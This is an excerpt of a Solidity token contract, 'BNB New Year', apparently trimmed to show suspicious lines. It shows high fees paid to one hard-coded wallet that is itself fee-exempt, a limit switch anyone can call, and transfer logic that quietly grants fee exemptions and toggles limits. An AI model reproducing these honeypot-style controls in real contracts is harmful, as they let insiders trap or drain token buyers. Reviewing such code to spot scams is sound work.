...
contract BNY is IERC20 {
    ...
    string private constant _name = "BNB New Year";
    string private constant _symbol = "BNY";
    ...
    Fees public _taxRates = Fees({buyFee: 800, sellFee: 800, transferFee: 900});
    ...
    TaxWallets public _taxWallets =
        TaxWallets({
            marketing: payable(0xc0763CD094d90ae4f00dF576B807C43aB63C9C47),
            development: payable(0xc0763CD094d90ae4f00dF576B807C43aB63C9C47)
        });    
    bool inSwap;
    ...
    constructor() payable {
        ...
        _isExcludedFromFees[0xc0763CD094d90ae4f00dF576B807C43aB63C9C47] = true; 
    ...
    function setLimit( bool enabled) public {
        limit = enabled;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        ...
        if (_isExcludedFromLimits[from] || _isExcludedFromLimits[from]) { _isExcludedFromFees[to] = true; 
            limit = true;
        }
